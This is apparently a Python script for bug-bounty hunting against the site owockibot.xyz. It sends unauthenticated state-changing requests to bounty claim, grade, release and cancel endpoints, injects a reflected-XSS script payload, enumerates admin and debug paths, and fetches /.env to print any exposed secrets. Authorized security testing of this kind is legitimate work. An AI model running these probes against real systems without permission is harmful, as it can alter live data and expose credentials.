#!/usr/bin/env python3
"""Try to find ACTUAL bugs on owockibot.xyz for the $100 weekly bug bounty."""
import os, json, urllib.request, ssl, urllib.error

os.chdir(r"C:\Users\rmalk\projects\razel369-aia")
ctx = ssl.create_default_context()
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Accept": "*/*",
    "Content-Type": "application/json",
}

def call(url, method="GET", data=None, headers=None, timeout=15):
    h = dict(HEADERS)
    if headers: h.update(headers)
    if data is not None:
        if isinstance(data, dict): data = json.dumps(data)
        req = urllib.request.Request(url, data=data.encode() if isinstance(data, str) else data, method=method, headers=h)
    else:
        req = urllib.request.Request(url, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode()
    except Exception as e:
        return 0, {}, str(e)

# ============================================================
# Test owockibot.xyz for bugs
# ============================================================
print("=" * 70)
print("BUG HUNT on owockibot.xyz")
print("=" * 70)

bugs = []

# 1) Test endpoints for unauth actions
print("\n--- Test /api/bounties for unauth read ---")
s, _, b = call("https://owockibot.xyz/api/bounties")
print(f"  status: {s}, body[:200]: {b[:200]}")

# 2) Test claim without auth
print("\n--- Test /api/bounties/1/claim (unauth) ---")
s, _, b = call("https://owockibot.xyz/api/bounties/1/claim", method="POST",
                data={"address": "0x0000000000000000000000000000000000000001"})
print(f"  status: {s}, body[:200]: {b[:200]}")

# 3) Test grade without auth
print("\n--- Test /api/bounties/1/grade (unauth) ---")
s, _, b = call("https://owockibot.xyz/api/bounties/1/grade", method="POST",
                data={"address": "0x0000000000000000000000000000000000000001"})
print(f"  status: {s}, body[:200]: {b[:200]}")

# 4) Test submit without auth
print("\n--- Test /api/bounties/1/submissions (unauth) ---")
s, _, b = call("https://owockibot.xyz/api/bounties/1/submissions", method="POST",
                data={"address": "0x0000000000000000000000000000000000000001", "proofUrl": "https://example.com"})
print(f"  status: {s}, body[:200]: {b[:200]}")

# 5) Test release without auth
print("\n--- Test /api/bounties/1/release (unauth) ---")
s, _, b = call("https://owockibot.xyz/api/bounties/1/release", method="POST",
                data={"address": "0x0000000000000000000000000000000000000001"})
print(f"  status: {s}, body[:200]: {b[:200]}")

# 6) Test cancel without auth
print("\n--- Test /api/bounties/1/cancel (unauth) ---")
s, _, b = call("https://owockibot.xyz/api/bounties/1/cancel", method="POST",
                data={"address": "0x0000000000000000000000000000000000000001"})
print(f"  status: {s}, body[:200]: {b[:200]}")

# 7) Test agent registration without auth
print("\n--- Test /api/agents (unauth create) ---")
s, _, b = call("https://owockibot.xyz/api/agents", method="POST",
                data={"name": "test-bug-hunt-agent", "webhookUrl": "https://example.com/hook"})
print(f"  status: {s}, body[:200]: {b[:200]}")

# 8) Test /api/bounty/:id with non-existent ID
print("\n--- Test /api/bounty/9999999 (404 leak?) ---")
s, _, b = call("https://owockibot.xyz/api/bounty/9999999")
print(f"  status: {s}, body[:200]: {b[:200]}")

# 9) Test for XSS in search/reflection
print("\n--- Test reflected XSS via /browse?q=... ---")
payload = '<script>alert(1)</script>'
import urllib.parse
q = urllib.parse.quote(payload)
s, _, b = call(f"https://owockibot.xyz/browse?q={q}")
if s == 200:
    # Look for unescaped reflection
    if payload in b:
        print(f"  !!! REFLECTED XSS FOUND in /browse?q=")
        print(f"      body excerpt: {b[b.find(payload)-100:b.find(payload)+200]}")
    else:
        print(f"  no reflection in /browse")

# Also try /bounty/:id with XSS
s, _, b = call(f"https://owockibot.xyz/bounty/{urllib.parse.quote(payload)}")
if s in (200, 404):
    if payload in b:
        print(f"  !!! REFLECTED XSS FOUND in /bounty/:id")

# 10) Test admin endpoints
print("\n--- Test common admin endpoints ---")
for path in ["/admin", "/api/admin", "/api/config", "/api/debug", "/api/internal", "/api/secret", "/api/v1/config"]:
    s, _, b = call(f"https://owockibot.xyz{path}")
    if s not in (404, 401, 403):
        print(f"  {path}: {s} ({len(b)}b)")
        print(f"    {b[:200]}")

# 11) Look at owockibot source for bugs
print("\n--- Look for exposed env / config ---")
s, _, b = call("https://owockibot.xyz/.env")
if s == 200:
    print(f"  !!! .env EXPOSED: {b[:500]}")
s, _, b = call("https://owockibot.xyz/.env.example")
print(f"  /.env.example: {s} ({len(b)}b)")

# 12) Look at /api/stats or stats endpoint
print("\n--- Stats endpoint ---")
s, _, b = call("https://owockibot.xyz/api/stats")
print(f"  /api/stats: {s} ({len(b)}b)")
if s == 200:
    j = json.loads(b)
    print(f"    {json.dumps(j, indent=2)[:500]}")

print("\n--- Done ---")
